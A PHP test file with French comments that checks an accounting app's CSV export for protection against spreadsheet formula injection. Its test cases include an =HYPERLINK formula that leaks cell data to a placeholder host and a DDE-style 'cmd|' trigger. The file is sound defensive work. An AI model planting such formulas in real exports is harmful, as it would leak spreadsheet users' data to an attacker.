<?php
// Exports CSV : une cellule qui commence par =, +, -, @, une tabulation ou un
// retour chariot est lue comme une FORMULE par un tableur. Lancement :
// php tests/csv_test.php
//
// Ce que ce test protège : les écritures exportées portent la communication
// et le nom du payeur d'un virement importé — un texte que n'importe qui
// choisit, pour le prix d'un virement d'un franc. Sans neutralisation,
// « =HYPERLINK(…) » arrivait tel quel dans le fichier qu'ouvre le
// vérificateur. Trois choses sont vérifiées : la règle (csv_cellule()), le
// fichier réellement produit par l'export des écritures, et qu'aucun CSV ne
// s'écrit plus sans passer par csv_ecrire().
//
// Base TEMPORAIRE, comme tests/export_suisa_test.php.

declare(strict_types=1);

$tmp = sys_get_temp_dir() . '/lasso_csv_' . bin2hex(random_bytes(6)) . '.sqlite';
define('APP_DB_PATH', $tmp);

require_once __DIR__ . '/../lib/config.php';
require_once __DIR__ . '/../lib/calc.php';
require_once __DIR__ . '/../lib/db.php';
require_once __DIR__ . '/../lib/helpers.php';
require_once __DIR__ . '/../lib/modules.php';
require_once __DIR__ . '/../lib/compta.php';
require_once __DIR__ . '/../lib/pieces.php';
require_once __DIR__ . '/../lib/routes.php';
require_once __DIR__ . '/../lib/routes_compta.php';

require_once __DIR__ . '/_outils.php';
register_shutdown_function(function () use ($tmp) {
    foreach ([$tmp, $tmp . '-wal', $tmp . '-shm'] as $f) {
        if (is_file($f)) @unlink($f);
    }
});

// 1) La règle. Les cas s'affichent à la fin : la route termine par exit() et
//    rien ne doit sortir avant ses en-têtes.
$regle = [
    ['=HYPERLINK("http://x.test/?"&A1)', "'=HYPERLINK(\"http://x.test/?\"&A1)"],
    ['=1+1', "'=1+1"],
    ['+A1', "'+A1"],
    ['-1+cmd|x', "'-1+cmd|x"],
    ['@SOMME(A1)', "'@SOMME(A1)"],
    ["\t=1", "'\t=1"],
    ["\r=1", "'\r=1"],
    ['-Dupont', "'-Dupont"],
    // Sans lettre, ni =, ni @ : rien d'exploitable, et ce sont des données.
    ['-12.50', '-12.50'],
    ['+41 22 999 88 77', '+41 22 999 88 77'],
    ['2026-03-01', '2026-03-01'],
    ['', ''],
    ['Loyer = mars', 'Loyer = mars'],
];

// 2) L'export réel des écritures.
db();
db()->prepare('INSERT INTO utilisateurs (email, mot_de_passe) VALUES (?, ?)')->execute(['t@example.test', 'x']);
$_SESSION = ['uid' => 1, 'last_activity' => time(), 'login_time' => time()];
db()->exec("INSERT INTO comptes_bancaires (id, libelle, iban) VALUES (1, 'Compte test', 'CH00TEST')");
db()->prepare('INSERT INTO ecritures (compte_bancaire_id, date_op, texte, tiers, communication, montant, hash) VALUES (1, ?, ?, ?, ?, ?, ?)')
    ->execute(['2026-03-01', 'Virement reçu', '=HYPERLINK("http://x.test/?"&E2)', '@SOMME(E2:E9)', -12.5, 'h1']);

$_SERVER['REQUEST_METHOD'] = 'GET';
$_GET = ['p' => 'compta_ecritures_exporter_csv', 'annee' => '2026'];
ob_start();
register_shutdown_function(function () use ($regle) {
    $csv = (string) ob_get_clean();
    global $tests, $fails;

    echo "1) Règle de neutralisation\n";
    foreach ($regle as [$entree, $attendu]) {
        check('csv_cellule(' . json_encode($entree) . ')', $attendu, csv_cellule($entree));
    }

    echo "\n2) Export des écritures\n";
    $lignes = array_map(fn ($l) => str_getcsv($l, ';', '"', '\\'), array_values(array_filter(explode("\n", trim($csv)))));
    $ligne = $lignes[1] ?? [];
    check('le tiers importé est neutralisé', "'=HYPERLINK(\"http://x.test/?\"&E2)", $ligne[2] ?? null);
    check('la communication importée est neutralisée', "'@SOMME(E2:E9)", $ligne[3] ?? null);
    check('le montant négatif reste un nombre', '-12.50', $ligne[4] ?? null);
    check('le texte ordinaire est intact', 'Virement reçu', $ligne[1] ?? null);

    echo "\n3) Une seule porte d'écriture\n";
    // fputcsv() n'apparaît que dans csv_ecrire() : un export ajouté plus tard
    // qui l'appellerait directement échapperait à la neutralisation.
    $racine = dirname(__DIR__);
    $fichiers = array_merge(
        glob("$racine/*.php") ?: [],
        glob("$racine/{lib,views,scripts}/*.php", GLOB_BRACE) ?: [],
        glob("$racine/lib/*/*.php") ?: [],
        glob("$racine/lib/*/*/*.php") ?: []
    );
    $directs = [];
    foreach ($fichiers as $f) {
        $n = preg_match_all('/\bfputcsv\s*\(/', (string) file_get_contents($f));
        if ($n && !str_ends_with($f, '/lib/helpers.php')) {
            $directs[] = substr($f, strlen($racine) + 1);
        }
    }
    check('aucun fputcsv() hors de csv_ecrire()', [], $directs);

    echo "\n$tests tests, $fails échec(s)\n";
    exit($fails > 0 ? 1 : 0);
});
route_compta_ecritures_exporter_csv();
